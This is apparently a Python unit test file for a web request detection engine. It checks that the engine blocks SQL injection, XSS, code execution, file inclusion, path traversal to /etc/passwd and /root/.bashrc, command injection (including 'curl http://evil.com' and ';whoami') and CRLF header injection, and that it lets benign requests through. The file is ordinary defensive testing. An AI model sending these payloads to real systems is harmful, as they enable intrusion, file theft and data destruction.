import unittest
from src.detection.engine import DetectionEngine

class TestDetectionEngine(unittest.TestCase):
    def setUp(self):
        self.engine = DetectionEngine(test_mode=False)  

    def test_sqli_detection(self):
        test_cases = [
            ("/search?q=1' OR 1=1--", True),
            ("/products?id=1 AND 1=1", True),
            ("/search?q=1' OR '1'='1", True),
            ("/admin?id=1; DROP TABLE users", True),
            ("/search?q=hello", False),
            ("/products?id=123", False)
        ]

        for url, should_block in test_cases:
            result = self.engine.analyze({"url": url, "body": "", "headers": {}})
            self.assertEqual(result["action"] == "block", should_block,
                             f"Failed on: {url} (expected {'block' if should_block else 'allow'})")

    def test_xss_detection(self):
        test_cases = [
            ("/", "<script>alert(1)</script>", True),
            ("/search", "<img src=x onerror=alert(1)>", True),
            ("/", "Hello World", False)
        ]

        for url, body, should_block in test_cases:
            result = self.engine.analyze({"url": url, "body": body, "headers": {}})
            self.assertEqual(result["action"] == "block", should_block,
                             f"Failed on: {body} (expected {'block' if should_block else 'allow'})")

    def test_rce_detection(self):
        test_cases = [
            ("/run", "system('ls')", True),
            ("/run", "eval(base64_decode('...'))", True),
            ("/run", "hello world", False)
        ]

        for url, body, should_block in test_cases:
            result = self.engine.analyze({"url": url, "body": body, "headers": {}})
            self.assertEqual(result["action"] == "block", should_block,
                             f"Failed on: {body} (expected {'block' if should_block else 'allow'})")

    def test_lfi_detection(self):
        test_cases = [
            ("/view?file=../../etc/passwd", "", True),
            ("/view?input=../../log.txt", "", True),
            ("/view?file=index.html", "", False)
        ]

        for url, body, should_block in test_cases:
            result = self.engine.analyze({"url": url, "body": body, "headers": {}})
            self.assertEqual(result["action"] == "block", should_block,
                             f"Failed on: {url} (expected {'block' if should_block else 'allow'})")

    def test_cmd_injection(self):
        test_cases = [
            ("/ping?host=127.0.0.1;whoami", "", True),
            ("/cmd", "curl http://evil.com", True),
            ("/cmd", "ls -la", True),
            ("/cmd", "hello world", False)
        ]

        for url, body, should_block in test_cases:
            result = self.engine.analyze({"url": url, "body": body, "headers": {}})
            self.assertEqual(result["action"] == "block", should_block,
                             f"Failed on: {url or body} (expected {'block' if should_block else 'allow'})")

    def test_path_traversal(self):
        test_cases = [
            ("/get?path=../../root/.bashrc", "", True),
            ("/get?path=../../etc/config", "", True),
            ("/get?path=docs/readme.txt", "", False)
        ]

        for url, body, should_block in test_cases:
            result = self.engine.analyze({"url": url, "body": body, "headers": {}})
            self.assertEqual(result["action"] == "block", should_block,
                             f"Failed on: {url} (expected {'block' if should_block else 'allow'})")

    def test_header_injection(self):
        test_cases = [
            ("/", "", {"User-Agent": "Mozilla\r\nX-Injected: true"}, True),
            ("/", "", {"User-Agent": "Mozilla\nX-Injected: true"}, True),
            ("/", "", {"X-Header": "Value\rMalicious"}, True),
            ("/", "", {"User-Agent": "Mozilla/5.0"}, False),
            ("/", "", {"Accept": "application/json"}, False)
        ]

        for url, body, headers, should_block in test_cases:
            result = self.engine.analyze({"url": url, "body": body, "headers": headers})
            self.assertEqual(result["action"] == "block", should_block,
                        f"Failed on headers: {headers} (expected {'block' if should_block else 'allow'})")
if __name__ == "__main__":
    unittest.main()
